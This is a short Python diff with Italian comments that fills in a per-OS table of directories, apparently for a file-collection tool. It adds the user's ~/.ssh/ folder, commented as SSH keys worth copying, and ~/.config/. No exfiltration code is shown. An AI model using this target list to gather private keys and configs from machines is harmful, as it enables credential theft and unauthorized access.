@@ -54,10 +54,10 @@ Struttura: key: [Linux, Win, MacOS]
 """
 __filesystem_hierarchy = {"1": ["/", "C:/", "/"],  # Da utilizzare in maniera non ricorsiva, ma per avere le info generali sulle directory possibili
                           "2": [f"/home/{os.getlogin()}/", f"C:/Users/{os.getlogin()}", f"/Users/{os.getlogin()}"],
-                          "3": [],  # SSH KEYS (Potrebbe risultare interessante copiare queste informazioni)
+                          "3": [f"/home/{os.getlogin()}/.ssh/"],  # SSH KEYS (Potrebbe risultare interessante copiare queste informazioni)
                           "4": [],  # Recupero Immagini (?)
                           "5": [],  # Recupero Documenti (?)
-                          "6": [],  # Recupero File di config (?)
+                          "6": [f"/home/{os.getlogin()}/.config/"],  # Recupero File di config (?)
                           }
 
 
